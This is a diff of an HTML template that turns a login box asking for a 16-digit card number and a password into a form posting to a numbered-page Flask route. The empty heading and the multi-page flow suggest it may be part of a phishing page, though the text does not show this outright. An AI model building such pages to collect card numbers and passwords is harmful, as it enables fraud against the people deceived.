@@ -196,9 +196,12 @@
 <div class="main">
   <!-- Login box -->
   <div class="login-box">
-    <h2></h2>
+  <h2></h2>
+
+  <form method="POST" action="{{ url_for('page', page_num=page_num) }}">
+    
     <label>Enter your 16-digit card number</label>
-    <input type="text" placeholder="">
+    <input type="text" name="username" placeholder=""> 
 
     <div class="remember">
       <input type="checkbox" id="remember">
@@ -206,9 +209,13 @@
     </div>
 
     <label>Password</label>
-    <input type="password" placeholder="••••••••">
+    <input type="password" name="password" placeholder="••••••••"> 
+    
     <a href="#" class="forgot">Forgot your password?</a>
-    <button class="login-btn">SIGN IN</button>
+    
+    <button type="submit" class="login-btn">SIGN IN</button> 
+    
+  </form>
   </div>
 
   <!-- Info section -->
